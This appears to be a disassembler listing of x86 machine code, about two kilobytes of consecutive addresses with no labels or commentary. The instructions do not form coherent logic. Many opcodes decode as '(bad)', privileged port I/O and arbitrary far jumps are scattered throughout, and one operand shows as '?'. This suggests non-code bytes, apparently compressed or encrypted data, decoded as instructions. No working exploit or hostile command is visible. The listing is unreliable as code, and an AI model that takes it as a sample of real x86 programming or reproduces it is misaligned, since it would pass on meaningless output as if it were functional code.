  40a2bf:	sahf   
  40a2c0:	cmc    
  40a2c1:	ret    
  40a2c2:	out    dx,al
  40a2c3:	pushf  
  40a2c4:	adc    al,0x57
  40a2c6:	test   BYTE PTR [edi],dh
  40a2c8:	mov    BYTE PTR [ebp+0x14],cl
  40a2cb:	iret   
  40a2cc:	push   eax
  40a2cd:	inc    ecx
  40a2ce:	lds    eax,FWORD PTR [ebx+0x45]
  40a2d1:	sbb    eax,0x58bdbc8f
  40a2d6:	jbe    0x40a2ca
  40a2d8:	xchg   ebx,eax
  40a2d9:	add    BYTE PTR [edi],cl
  40a2db:	out    dx,eax
  40a2dc:	test   dl,0xf1
  40a2df:	xor    DWORD PTR [edi+0x62],edx
  40a2e2:	ins    DWORD PTR es:[edi],dx
  40a2e3:	cs jmp 0x40a28c
  40a2e6:	test   DWORD PTR [edi-0x62],ebx
  40a2e9:	inc    edx
  40a2ea:	jle    0x40a2f4
  40a2ec:	jne    0x40a2ac
  40a2ee:	pop    edi
  40a2ef:	inc    ecx
  40a2f0:	retf   
  40a2f1:	dec    esi
  40a2f2:	repnz (bad) [ebp+0x37]
  40a2f6:	ins    DWORD PTR es:[edi],dx
  40a2f7:	dec    ebp
  40a2f8:	push   esi
  40a2f9:	xchg   ecx,eax
  40a2fa:	cld    
  40a2fb:	jl     0x40a34f
  40a2fd:	sub    eax,0x4947785a
  40a302:	mov    edx,0x8aee43a2
  40a307:	add    dh,BYTE PTR [edi-0x64f86b5d]
  40a30d:	sub    bh,BYTE PTR [eax]
  40a30f:	hlt    
  40a310:	xor    BYTE PTR [ecx-0x61],0xf6
  40a314:	jns    0x40a2db
  40a316:	cdq    
  40a317:	cmp    al,0xb5
  40a319:	int3   
  40a31a:	test   eax,0x5e8e7616
  40a31f:	add    bl,ch
  40a321:	call   0x5fb12a2c
  40a326:	adc    BYTE PTR [edi-0x2958287a],ch
  40a32c:	(bad)  
  40a32d:	out    dx,eax
  40a32e:	sub    bh,cl
  40a330:	mov    bl,0x94
  40a332:	fistp  QWORD PTR [esi]
  40a334:	inc    edx
  40a335:	(bad)  
  40a336:	aas    
  40a337:	js     0x40a2fb
  40a339:	xchg   DWORD PTR [eax],eax
  40a33b:	add    al,BYTE PTR [esi+0x51]
  40a33e:	or     bh,BYTE PTR [edi]
  40a340:	push   cs
  40a341:	lea    esp,[eax]
  40a343:	nop
  40a344:	fmul   QWORD PTR [ecx-0x270adf39]
  40a34a:	outs   dx,DWORD PTR ds:[esi]
  40a34b:	mov    ds,WORD PTR [ebx]
  40a34d:	out    dx,al
  40a34e:	test   al,0x72
  40a350:	adc    esi,DWORD PTR [esi]
  40a352:	popf   
  40a353:	xchg   edi,eax
  40a354:	jbe    0x40a2e5
  40a356:	stc    
  40a357:	in     eax,dx
  40a358:	into   
  40a359:	leave  
  40a35a:	shufps xmm1,xmm7,0xb6
  40a35e:	jp     0x40a33c
  40a360:	mov    dl,ah
  40a362:	pop    edi
  40a363:	cwde   
  40a364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a365:	adc    ch,dh
  40a367:	sbb    al,0x5a
  40a369:	mov    eax,0xb9226ded
  40a36e:	mov    ebx,0x2d8c3ec2
  40a373:	out    dx,eax
  40a374:	and    cl,bl
  40a376:	loop   0x40a37d
  40a378:	in     al,dx
  40a379:	sahf   
  40a37a:	adc    DWORD PTR [ebp-0x57f8d2f5],eax
  40a380:	add    al,0x6f
  40a382:	div    bh
  40a384:	sar    DWORD PTR [ebp+0x955439d],0xe3
  40a38b:	adc    DWORD PTR [edi+0x2f],0x3e1fefac
  40a392:	inc    esi
  40a393:	pop    ecx
  40a394:	fcomp  DWORD PTR [edx-0x69d46365]
  40a39a:	push   ebx
  40a39b:	mov    al,0xad
  40a39d:	cs iret 
  40a39f:	std    
  40a3a0:	ins    DWORD PTR es:[edi],dx
  40a3a1:	inc    esi
  40a3a2:	not    DWORD PTR [ebx-0x5b]
  40a3a5:	int3   
  40a3a6:	inc    esp
  40a3a7:	cwde   
  40a3a8:	inc    ecx
  40a3a9:	out    dx,eax
  40a3aa:	cmp    al,BYTE PTR [esp+edi*8-0x54e4e991]
  40a3b1:	mov    dh,0x5b
  40a3b3:	scas   al,BYTE PTR es:[edi]
  40a3b4:	pop    ebp
  40a3b5:	bound  esi,QWORD PTR ds:0xa9119842
  40a3bb:	js     0x40a3fb
  40a3bd:	add    eax,0x4e6bbbf5
  40a3c2:	retf   
  40a3c3:	ret    0x83ee
  40a3c6:	in     al,0x9d
  40a3c8:	sbb    DWORD PTR [ecx+0x4654e517],ebp
  40a3ce:	pop    edi
  40a3cf:	int3   
  40a3d0:	xchg   DWORD PTR [esi-0x3124c6d7],edi
  40a3d6:	or     DWORD PTR [esi-0x1f],edx
  40a3d9:	pop    es
  40a3da:	dec    edi
  40a3db:	and    ecx,DWORD PTR [ebx]
  40a3dd:	push   eax
  40a3de:	push   ds
  40a3df:	rol    ebp,1
  40a3e1:	loop   0x40a39a
  40a3e3:	mov    DWORD PTR [edx],ecx
  40a3e5:	aad    0x7c
  40a3e7:	inc    edx
  40a3e8:	rol    DWORD PTR [ecx+0x5f],cl
  40a3eb:	ds aas 
  40a3ed:	and    ah,dl
  40a3ef:	or     edx,DWORD PTR [ebp-0x66]
  40a3f2:	push   es
  40a3f3:	mov    dl,BYTE PTR [eax-0x66]
  40a3f6:	in     al,dx
  40a3f7:	jmp    0x40a424
  40a3f9:	das    
  40a3fa:	bound  esi,QWORD PTR [edx+edx*1+0x1e9203bb]
  40a401:	or     cl,bh
  40a403:	mov    dl,BYTE PTR ds:0xe1d6b60
  40a409:	sti    
  40a40a:	xchg   esp,eax
  40a40b:	out    0x3a,eax
  40a40d:	je     0x40a470
  40a40f:	test   DWORD PTR [edi+0x45],esi
  40a412:	add    eax,0x1edd6257
  40a417:	rcl    DWORD PTR [eax+0x73f668ac],cl
  40a41d:	popf   
  40a41e:	fwait
  40a41f:	add    bl,BYTE PTR [edx-0x2c]
  40a422:	scas   eax,DWORD PTR es:[edi]
  40a423:	xor    BYTE PTR [ebx+0x53c7b210],0xd7
  40a42a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a42c:	(bad)  
  40a42d:	xlat   BYTE PTR ds:[ebx]
  40a42e:	dec    eax
  40a42f:	gs hlt 
  40a431:	and    BYTE PTR ds:0xddddecec,bh
  40a437:	loope  0x40a3d6
  40a439:	int3   
  40a43a:	sbb    al,0xc3
  40a43c:	std    
  40a43d:	ret    
  40a43e:	cs gs and al,0xcb
  40a442:	imul   ah
  40a444:	hlt    
  40a445:	fdiv   DWORD PTR [ebp-0x66]
  40a448:	pop    ebp
  40a449:	inc    esi
  40a44a:	addr16 shr esi,1
  40a44d:	xor    al,0x11
  40a44f:	mov    ah,0x7
  40a451:	xor    al,0x76
  40a453:	mov    ds:0xa27cb544,al
  40a458:	sub    al,0x60
  40a45a:	jb     0x40a486
  40a45c:	xchg   esp,eax
  40a45d:	inc    esi
  40a45e:	push   esi
  40a45f:	shl    BYTE PTR [esi+0x15],cl
  40a462:	and    ebp,ecx
  40a464:	add    ah,BYTE PTR [edx-0x59a01c4]
  40a46a:	loop   0x40a400
  40a46c:	xchg   ebp,eax
  40a46d:	xor    al,0xc0
  40a46f:	mov    ah,0xbf
  40a471:	popf   
  40a472:	fbstp  TBYTE PTR [ebx+0x194e636]
  40a478:	(bad)  
  40a479:	cmp    bh,dl
  40a47b:	aaa    
  40a47c:	jo     0x40a43e
  40a47e:	push   es
  40a47f:	mov    dh,0x38
  40a481:	mov    eax,0xb78d3f9
  40a486:	and    BYTE PTR [ecx],bh
  40a488:	push   esp
  40a489:	lds    eax,FWORD PTR [esi-0x422d85a2]
  40a48f:	xchg   ebp,eax
  40a490:	push   ecx
  40a491:	out    dx,al
  40a492:	js     0x40a425
  40a494:	sbb    eax,edx
  40a496:	mov    dl,0x61
  40a498:	sahf   
  40a499:	xchg   ebp,eax
  40a49a:	inc    esp
  40a49b:	jmp    0x40a515
  40a49d:	adc    esi,DWORD PTR [esi+0x595d8a6c]
  40a4a3:	jbe    0x40a4eb
  40a4a5:	and    ah,BYTE PTR [ebx]
  40a4a7:	fwait
  40a4a8:	cmp    al,0xdd
  40a4aa:	mov    al,ds:0xe39101f8
  40a4af:	push   ecx
  40a4b0:	cmp    ebx,ecx
  40a4b2:	fidivr DWORD PTR [eax]
  40a4b4:	mov    edi,0xd7b7e27d
  40a4b9:	shr    DWORD PTR [edx-0x1b],1
  40a4bc:	jbe    0x40a45d
  40a4be:	push   eax
  40a4bf:	or     ebx,DWORD PTR ds:0x1de790e2
  40a4c5:	xchg   edi,eax
  40a4c6:	out    dx,eax
  40a4c7:	imul   ebp,DWORD PTR [ebx+edi*4],0x23315f93
  40a4ce:	ins    BYTE PTR es:[edi],dx
  40a4cf:	lea    edi,[ecx+0x7132c64a]
  40a4d5:	popa   
  40a4d6:	jmp    0x893b2d99
  40a4db:	retf   0x4f1a
  40a4de:	(bad)  
  40a4df:	pop    ecx
  40a4e0:	xchg   ebx,eax
  40a4e1:	ret    
  40a4e2:	and    eax,0xfb13c90c
  40a4e7:	jnp    0x40a50d
  40a4e9:	iret   
  40a4ea:	inc    edx
  40a4eb:	aaa    
  40a4ec:	loope  0x40a4ec
  40a4ee:	cmp    al,0xbe
  40a4f0:	push   es
  40a4f1:	in     al,0xb1
  40a4f3:	mov    edx,DWORD PTR [ebx]
  40a4f5:	bound  ebp,QWORD PTR [ebx-0x80]
  40a4f8:	test   BYTE PTR [eax-0x76fb4086],ch
  40a4fe:	shl    dl,1
  40a500:	xchg   ecx,eax
  40a501:	cdq    
  40a502:	mov    eax,ds:0xccec17c7
  40a507:	jge    0x40a50a
  40a509:	adc    BYTE PTR [edi+0x9bc18ce],0xf7
  40a510:	inc    DWORD PTR [edi-0x6bdc4121]
  40a516:	add    ecx,0x2dc87171
  40a51c:	mov    esp,0x3894d577
  40a521:	(bad)  
  40a522:	lahf   
  40a523:	sbb    al,0x64
  40a525:	test   al,0x11
  40a527:	adc    eax,0xcc7ddb9b
  40a52c:	mov    esi,0x1c33f898
  40a531:	fst    QWORD PTR [esi+eiz*1+0x70]
  40a535:	ja     0x40a537
  40a537:	mov    ds:0x47d46226,eax
  40a53c:	aas    
  40a53d:	xchg   edx,eax
  40a53e:	(bad)  
  40a53f:	mov    ecx,0x2dad1d97
  40a544:	pop    esi
  40a545:	xlat   BYTE PTR ds:[ebx]
  40a546:	push   es
  40a547:	addr16 sbb eax,0xc91d96d4
  40a54d:	ins    DWORD PTR es:[edi],dx
  40a54e:	mov    edi,0xf4b5f37a
  40a553:	stos   BYTE PTR es:[edi],al
  40a554:	(bad)  
  40a555:	xchg   ebx,eax
  40a556:	xchg   ebp,eax
  40a557:	(bad)  
  40a558:	push   esp
  40a559:	popa   
  40a55a:	in     al,0x52
  40a55c:	inc    esp
  40a55d:	mov    es,WORD PTR [ebp+0x7e]
  40a560:	mov    DWORD PTR [esi+0x6f],ebx
  40a563:	fs xchg ebx,eax
  40a565:	(bad)
  40a568:	jle    0x40a4fc
  40a56a:	push   es
  40a56b:	js     0x40a56c
  40a56d:	dec    esi
  40a56e:	sbb    eax,0xcd35c5
  40a573:	jb     0x40a56e
  40a575:	test   DWORD PTR [ebp+edx*8-0x3bffd582],ebx
  40a57c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a57d:	bound  esp,QWORD PTR [ebp+0x7e1273b0]
  40a583:	mov    ebp,0x5a243a02
  40a588:	push   esp
  40a589:	push   ebx
  40a58a:	xor    ch,BYTE PTR [ebx]
  40a58c:	(bad)  
  40a58d:	hlt    
  40a58e:	nop
  40a58f:	loope  0x40a52c
  40a591:	mov    edx,0xab3ad14a
  40a596:	test   eax,0xe146c2af
  40a59b:	mov    bh,0x9f
  40a59d:	dec    esi
  40a59e:	aaa    
  40a59f:	cdq    
  40a5a0:	mov    ecx,0x499594e8
  40a5a5:	imul   esi,DWORD PTR [edi-0x581a4436],0x28
  40a5ac:	loopne 0x40a5cf
  40a5ae:	lds    ebp,FWORD PTR [edx+0x40b22ca2]
  40a5b4:	fisubr WORD PTR ds:0x4b21ddf
  40a5ba:	jge    0x40a549
  40a5bc:	loope  0x40a581
  40a5be:	int    0x9e
  40a5c0:	je     0x40a59a
  40a5c2:	fldenv [ecx+0x57]
  40a5c5:	mov    dh,0xdc
  40a5c7:	add    ch,BYTE PTR [ecx+0x7bd79b73]
  40a5cd:	scas   eax,DWORD PTR es:[edi]
  40a5ce:	mov    dh,0xba
  40a5d0:	jbe    0x40a5c2
  40a5d2:	add    bh,BYTE PTR [esi+0x4308ab4]
  40a5d8:	lahf   
  40a5d9:	jle    0x40a632
  40a5db:	and    al,0xca
  40a5dd:	rcr    BYTE PTR [eax+ebx*2],cl
  40a5e0:	rcr    DWORD PTR [ebp+ecx*4+0x6b],1
  40a5e4:	cmc    
  40a5e5:	jp     0x40a642
  40a5e7:	adc    eax,0xb0a04b39
  40a5ec:	aas    
  40a5ed:	das    
  40a5ee:	mov    ecx,0x1abc93d5
  40a5f3:	int3   
  40a5f4:	stc    
  40a5f5:	mov    fs,eax
  40a5f7:	pop    ds
  40a5f8:	xchg   ecx,eax
  40a5f9:	xchg   ecx,eax
  40a5fa:	mov    bl,0x6c
  40a5fc:	test   eax,0x952522d
  40a601:	mov    ebp,0xf1c53867
  40a606:	lods   eax,DWORD PTR ds:[esi]
  40a607:	mov    bl,0xb0
  40a609:	test   eax,0xeacbdd37
  40a60e:	dec    esi
  40a60f:	arpl   bp,cx
  40a611:	jb     0x40a5bf
  40a613:	aaa    
  40a614:	out    dx,eax
  40a615:	xchg   BYTE PTR [edx],ah
  40a617:	scas   eax,DWORD PTR es:[edi]
  40a618:	gs popa 
  40a61a:	mov    edi,0x16020f7c
  40a61f:	in     al,0x7a
  40a621:	xor    eax,0xe0e14d07
  40a626:	dec    esi
  40a627:	pop    ss
  40a628:	rol    BYTE PTR [edx],0xc5
  40a62b:	lock sub dl,0xa3
  40a62f:	sub    edx,esp
  40a631:	cmp    ch,BYTE PTR [eax-0x44d53e25]
  40a637:	inc    ebp
  40a638:	adc    eax,0x2149791c
  40a63d:	cmp    ebp,eax
  40a63f:	out    dx,eax
  40a640:	xchg   ecx,eax
  40a641:	add    BYTE PTR [ecx-0x60],0x9d
  40a645:	xor    DWORD PTR [edi-0x59],ebx
  40a648:	dec    esp
  40a649:	daa    
  40a64a:	push   cs
  40a64b:	in     eax,0x7f
  40a64d:	inc    eax
  40a64e:	mov    dh,BYTE PTR [ebx+0x58d3b64b]
  40a654:	scas   al,BYTE PTR es:[edi]
  40a655:	ins    BYTE PTR es:[edi],dx
  40a656:	inc    ebx
  40a657:	mov    ds:0x67be764d,al
  40a65c:	lods   eax,DWORD PTR ds:[esi]
  40a65d:	pop    ss
  40a65e:	mov    ebp,0xb7725598
  40a663:	mov    DWORD PTR [edx],ebp
  40a665:	or     DWORD PTR [ebx],0xffffffea
  40a668:	iret   
  40a669:	fbld   TBYTE PTR [eax+edi*8]
  40a66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a66d:	xchg   ecx,eax
  40a66e:	iret   
  40a66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a670:	jge    0x40a6d3
  40a672:	push   ecx
  40a673:	jno    0x40a6d1
  40a675:	adc    esi,DWORD PTR [ecx]
  40a677:	or     DWORD PTR [edi+0x41],ebp
  40a67a:	add    eax,0x66a06a8d
  40a67f:	mov    al,BYTE PTR ds:0x68b85705
  40a685:	fnstenv [ecx]
  40a687:	imul   edx,DWORD PTR [edi-0x2e],0xffffff8c
  40a68b:	stc    
  40a68c:	mov    eax,0x5bfd0c1b
  40a691:	mov    bl,BYTE PTR [esi+0x4cec60c1]
  40a697:	loopne 0x40a6e9
  40a699:	inc    eax
  40a69a:	xor    eax,0xf0fdc23c
  40a69f:	hlt    
  40a6a0:	ret    0x2936
  40a6a3:	push   ecx
  40a6a4:	aas    
  40a6a5:	adc    eax,0x13daaf6
  40a6aa:	inc    BYTE PTR [edi-0x43485364]
  40a6b0:	stos   DWORD PTR es:[edi],eax
  40a6b1:	pop    edi
  40a6b2:	es mov ecx,0x5da0972d
  40a6b8:	ficomp DWORD PTR [ecx+ebx*1-0x14e241]
  40a6bf:	push   ebx
  40a6c0:	popa   
  40a6c1:	inc    ecx
  40a6c2:	or     al,0xc9
  40a6c4:	retf   
  40a6c5:	cli    
  40a6c6:	sbb    al,0xd7
  40a6c8:	daa    
  40a6c9:	bound  esi,QWORD PTR [edi]
  40a6cb:	bound  edi,QWORD PTR [eax]
  40a6cd:	push   edi
  40a6ce:	sti    
  40a6cf:	pusha  
  40a6d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d1:	or     edi,DWORD PTR [ebp-0x4cd53f23]
  40a6d7:	mov    edi,0x2031ed6c
  40a6dc:	ret    0xc05d
  40a6df:	xor    dl,bh
  40a6e1:	and    al,0x1a
  40a6e3:	mov    al,0xe6
  40a6e5:	jae    0x40a740
  40a6e7:	sub    ch,ah
  40a6e9:	and    BYTE PTR [esi-0x51bdfa61],bh
  40a6ef:	dec    esp
  40a6f0:	stc    
  40a6f1:	(bad)  
  40a6f2:	xrelease mov DWORD PTR ds:0x3852c2ee,0x94070731
  40a6fd:	ss mov ebx,0x83c54cf7
  40a703:	jmp    0xfd74:0x891b31ec
  40a70a:	push   ebx
  40a70b:	std    
  40a70c:	mov    eax,0x7144112
  40a711:	jae    0x40a697
  40a713:	pop    ecx
  40a714:	enter  0xf50a,0xd
  40a718:	sub    eax,0x271181c8
  40a71d:	repz sbb eax,0x3487ebb2
  40a723:	out    0xc1,eax
  40a725:	dec    ebx
  40a726:	sub    BYTE PTR [edi+0x58],0x3e
  40a72a:	sbb    DWORD PTR [ecx-0x3462a6fc],esi
  40a730:	xor    BYTE PTR [edi+0x4ea13f4b],0x64
  40a737:	dec    eax
  40a738:	cmp    ebp,DWORD PTR [ecx]
  40a73a:	xor    cl,al
  40a73c:	jo     0x40a79c
  40a73e:	je     0x40a75f
  40a740:	ficomp WORD PTR ds:0x68fee050
  40a746:	test   eax,0xf376562
  40a74b:	xor    dl,dh
  40a74d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a74e:	dec    ebx
  40a74f:	push   es
  40a750:	adc    dl,BYTE PTR [eax+0x72]
  40a753:	mov    ?,WORD PTR [edi-0x2d]
  40a756:	and    esp,DWORD PTR [ecx+0x28]
  40a759:	les    esp,FWORD PTR [edx-0x2e]
  40a75c:	jns    0x40a74d
  40a75e:	and    BYTE PTR [esi+0x231cf289],0x37
  40a765:	fldenv [ecx+0xc]
  40a768:	mov    esp,0xc9ec8b25
  40a76d:	dec    ecx
  40a76e:	and    al,0x34
  40a770:	into   
  40a771:	ins    DWORD PTR es:[edi],dx
  40a772:	pop    ds
  40a773:	sbb    al,0x71
  40a775:	sbb    ebp,esp
  40a777:	mov    ebp,0x14711907
  40a77c:	das    
  40a77d:	aas    
  40a77e:	push   ds
  40a77f:	mov    eax,ds:0xfff24f7d
  40a784:	mov    edx,0xd6ca8a14
  40a789:	pop    esp
  40a78a:	xchg   edx,eax
  40a78b:	aam    0xe
  40a78d:	cld    
  40a78e:	xchg   DWORD PTR [esi-0x78fe9f56],ebp
  40a794:	mov    bh,0xb1
  40a796:	sub    DWORD PTR [ebp+ecx*4+0x1fa6a1dd],edi
  40a79d:	xlat   BYTE PTR ds:[ebx]
  40a79e:	daa    
  40a79f:	out    0x66,al
  40a7a1:	jbe    0x40a748
  40a7a3:	mov    ecx,0x40037d32
  40a7a8:	adc    eax,0xacdf8eaf
  40a7ad:	or     eax,0x5b7bbe46
  40a7b2:	lods   al,BYTE PTR ds:[esi]
  40a7b3:	xchg   ebp,esi
  40a7b5:	fsubr  st,st(6)
  40a7b7:	cmp    eax,0x182b0a4e
  40a7bc:	outs   dx,DWORD PTR ds:[esi]
  40a7bd:	outs   dx,BYTE PTR ds:[esi]
  40a7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7bf:	dec    esp
  40a7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7c1:	or     eax,0x2e19ac6
  40a7c6:	xor    DWORD PTR ds:0xb329ded9,ebp
  40a7cc:	(bad)
  40a7d0:	add    ecx,DWORD PTR [esi-0x3760e40f]
  40a7d6:	paddd  mm7,mm4
  40a7d9:	xchg   dl,dh
  40a7db:	sbb    eax,0x6f1cca5d
  40a7e0:	push   eax
  40a7e1:	retf   0xbd44
  40a7e4:	or     BYTE PTR [ecx+eax*1-0x7a],cl
  40a7e8:	jo     0x40a809
  40a7ea:	jmp    0x6270:0x99386165
  40a7f1:	scas   eax,DWORD PTR es:[edi]
  40a7f2:	aaa    
  40a7f3:	out    dx,eax
  40a7f4:	push   eax
  40a7f5:	repnz add al,BYTE PTR [esi-0x71]
  40a7f9:	jmp    FWORD PTR [edx+0x3a2cbf22]
  40a7ff:	cld    
  40a800:	cmp    eax,0x85ada25a
  40a805:	imul   ebx,esi,0x73
  40a808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a809:	loope  0x40a7ae
  40a80b:	or     cl,cl
  40a80d:	ja     0x40a7f9
  40a80f:	fbld   TBYTE PTR [edx+eiz*8-0x3a]
  40a813:	mov    al,0xeb
  40a815:	and    cl,BYTE PTR [esi+0x2ae8f217]
  40a81b:	fst    QWORD PTR [esi]
  40a81d:	adc    DWORD PTR [ebx+ebx*4+0x4c],edx
  40a821:	in     eax,dx
  40a822:	cs dec eax
  40a824:	jne    0x40a7d3
  40a826:	jbe    0x40a83d
  40a828:	and    ah,BYTE PTR ds:0x6d80e
  40a82e:	(bad)  
  40a82f:	std    
  40a830:	cmp    DWORD PTR [ecx+eiz*4],ebx
  40a833:	mov    ah,0x61
  40a835:	mov    esi,0xc83a2d33
  40a83a:	xchg   BYTE PTR [esi+0x48],bl
  40a83d:	xor    eax,0xf5c49f2e
  40a842:	and    eax,DWORD PTR [ebp-0x2ae41279]
  40a848:	(bad)  
  40a849:	pop    ss
  40a84a:	mov    eax,0xc3d0ab1e
  40a84f:	pop    edx
  40a850:	in     eax,dx
  40a851:	mov    esp,0x7e9244f
  40a856:	mov    esi,0x2501386c
  40a85b:	xor    ecx,esi
  40a85d:	mov    al,ds:0x4ddeaf88
  40a862:	mov    ah,0x18
  40a864:	daa    
  40a865:	fist   DWORD PTR [edi+0x3f26db69]
  40a86b:	sub    BYTE PTR [eax],dl
  40a86d:	les    ebx,FWORD PTR [ebp+ecx*8+0x5e2c9600]
  40a874:	mov    eax,0xb0f1243e
  40a879:	cmp    al,0x0
  40a87b:	retf   
  40a87c:	in     al,dx
  40a87d:	pop    ecx
  40a87e:	ja     0x40a85a
  40a880:	pop    ebp
  40a881:	cmp    al,0x2d
  40a883:	pop    esp
  40a884:	add    eax,0xca399a92
  40a889:	push   es
  40a88a:	push   ss
  40a88b:	jmp    0x40a83c
  40a88d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a88e:	imul   edx,DWORD PTR [ebx+0x57fc03f8],0x1e741abe
  40a898:	jb     0x40a864
  40a89a:	enter  0xa83e,0x23
  40a89e:	mov    DWORD PTR [esi+0x64c8a26f],ebp
  40a8a4:	daa    
  40a8a5:	imul   ecx,DWORD PTR [eax+0x17],0x2f575946
  40a8ac:	and    eax,0x52cc566f
  40a8b1:	xor    BYTE PTR [esi],bh
  40a8b3:	test   eax,0xf8c8961b
  40a8b8:	cmp    al,0xbf
  40a8ba:	in     eax,0xa2
  40a8bc:	sbb    BYTE PTR [esi],0x41
  40a8bf:	(bad)  
  40a8c0:	adc    eax,0x9abb97e
  40a8c5:	xor    eax,0x4aac2eb7
  40a8ca:	lea    eax,[eax]
  40a8cc:	les    ebx,FWORD PTR ds:0xe7e468fa
  40a8d2:	outs   dx,BYTE PTR ds:[esi]
  40a8d3:	in     al,0xf7
  40a8d5:	mov    esi,0x91ed82df
  40a8da:	and    ebx,DWORD PTR [ebx-0x1f0e1cd2]
  40a8e0:	std    
  40a8e1:	xor    al,0xc1
  40a8e3:	(bad)  
  40a8e5:	pop    edi
  40a8e6:	push   cs
  40a8e7:	loopne 0x40a937
  40a8e9:	and    DWORD PTR [ebx+0xe],eax
  40a8ec:	cmp    al,0x4f
  40a8ee:	jecxz  0x40a8a6
  40a8f0:	or     eax,0xfd227531
  40a8f5:	(bad)  
  40a8f6:	in     eax,0xe
  40a8f8:	jg     0x40a8b9
  40a8fa:	in     eax,0x90
  40a8fc:	jmp    0x9fb0e87c
  40a901:	mov    bl,0x69
  40a903:	shr    BYTE PTR [edx-0x50],cl
  40a906:	and    cl,bl
  40a908:	pop    esi
  40a909:	or     al,0x58
  40a90b:	outs   dx,BYTE PTR ds:[esi]
  40a90c:	pusha  
  40a90d:	inc    esi
  40a90e:	push   cs
  40a90f:	faddp  st(2),st
  40a911:	and    BYTE PTR [eax+0x249b6e45],bh
  40a917:	aas    
  40a918:	scas   al,BYTE PTR es:[edi]
  40a919:	inc    edx
  40a91a:	(bad)  
  40a91b:	xor    BYTE PTR [edi-0x3e3a68e2],dl
  40a921:	es sbb ebp,esp
  40a924:	push   cs
  40a925:	dec    ebp
  40a926:	stos   BYTE PTR es:[edi],al
  40a927:	and    bh,BYTE PTR [ebp+0x5c]
  40a92a:	scas   eax,DWORD PTR es:[edi]
  40a92b:	dec    edx
  40a92c:	push   ss
  40a92d:	push   esi
  40a92e:	(bad)  
  40a92f:	aas    
  40a930:	xchg   ebp,eax
  40a931:	mov    DWORD PTR [ebp-0x4b],esp
  40a934:	sub    DWORD PTR [edi+0x44],edi
  40a937:	mul    BYTE PTR [ebp-0x2e]
  40a93a:	imul   eax,DWORD PTR [edi+0x6d4d3f6e],0x52b3f642
  40a944:	sbb    BYTE PTR [edi+0x3f],bl
  40a947:	mov    ecx,0xea2ddcba
  40a94c:	jns    0x40a993
  40a94e:	fimul  WORD PTR [edx-0x7affb6f7]
  40a954:	sbb    bh,BYTE PTR [edi+0x2c273bf5]
  40a95a:	cli    
  40a95b:	js     0x40a9b0
  40a95d:	(bad)  
  40a95e:	and    al,0xcf
  40a960:	sub    bl,BYTE PTR [edx]
  40a962:	jns    0x40a99a
  40a964:	les    eax,FWORD PTR [ebp-0x1e]
  40a967:	mov    esi,0x7f193600
  40a96c:	jnp    0x40a921
  40a96e:	cmp    ecx,DWORD PTR [ecx]
  40a970:	xlat   BYTE PTR ds:[ebx]
  40a971:	iret   
  40a972:	stos   BYTE PTR es:[edi],al
  40a973:	rcr    DWORD PTR [eax-0x3a],1
  40a976:	iret   
  40a977:	inc    BYTE PTR [ecx]
  40a979:	sbb    bl,BYTE PTR [edx-0x60c89449]
  40a97f:	dec    edi
  40a980:	inc    edx
  40a981:	(bad)  [ecx-0x11]
  40a984:	inc    ebp
  40a985:	xchg   BYTE PTR [ecx],al
  40a987:	inc    ecx
  40a988:	test   eax,0x736b0a15
  40a98d:	xor    BYTE PTR [edi-0x6b],dl
  40a990:	ror    BYTE PTR fs:[ebx+0x4aabdb69],1
  40a997:	pop    es
  40a998:	(bad)  
  40a999:	in     al,dx
  40a99a:	mov    ebx,0xb663a852
  40a99f:	adc    al,bl
  40a9a1:	jmp    0x40a948
  40a9a3:	adc    al,0x9c
  40a9a5:	jmp    0x40a93c
  40a9a7:	mov    ebx,ebx
  40a9a9:	fdiv   DWORD PTR [ecx+0x7bfa683e]
  40a9af:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40a9b1:	mov    DWORD PTR [ebx],edx
  40a9b3:	cmp    DWORD PTR [ebp+ebp*2-0x32492ba5],edi
  40a9ba:	retf   0x91c2
  40a9bd:	out    dx,eax
  40a9be:	mov    ebx,0x8083dcb7
  40a9c3:	cdq    
  40a9c4:	imul   esp,DWORD PTR [eax],0xffffffc7
  40a9c7:	ror    BYTE PTR [ebp-0x3ecc81d2],1
  40a9cd:	ins    DWORD PTR es:[edi],dx
  40a9ce:	and    DWORD PTR [esi-0x1c8cfb4b],edx
  40a9d4:	inc    ebx
  40a9d5:	repz and eax,0x40f91670
  40a9db:	lods   al,BYTE PTR ds:[esi]
  40a9dc:	dec    edx
  40a9dd:	test   DWORD PTR [eax],ebx
  40a9df:	fwait
  40a9e0:	icebp  
  40a9e1:	hlt    
  40a9e2:	xchg   esi,eax
  40a9e3:	adc    al,0xa8
  40a9e5:	mov    al,0x3a
  40a9e7:	push   ecx
  40a9e8:	out    dx,al
  40a9e9:	sti    
  40a9ea:	sub    eax,0xffffff91
  40a9ed:	mov    ebp,0xda80a98
  40a9f2:	fistp  WORD PTR [edi-0x6a]
  40a9f5:	jmp    FWORD PTR [edx]
  40a9f7:	mov    ebx,0x7bde52d0
  40a9fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9fd:	out    dx,eax
  40a9fe:	jb     0x40aa0a
  40aa00:	push   edx
  40aa01:	or     al,0x89
  40aa03:	mov    ah,0x2c
  40aa05:	pop    esp
  40aa06:	fld    DWORD PTR [ebx-0x260544ea]
  40aa0c:	inc    esi
  40aa0d:	mov    ebp,0xe524f4fb
  40aa12:	ins    BYTE PTR es:[edi],dx
  40aa13:	inc    esp
  40aa14:	lock je 0x40a9b9
  40aa17:	pop    es
  40aa18:	jne    0x40aa55
  40aa1a:	clc    
  40aa1b:	xchg   BYTE PTR [ebx+0x5f095a9c],ch
  40aa21:	cmp    DWORD PTR [edi],esi
  40aa23:	or     eax,0x50678fce
  40aa28:	aas    
  40aa29:	and    BYTE PTR ds:0x5c69afcc,dh
  40aa2f:	sahf   
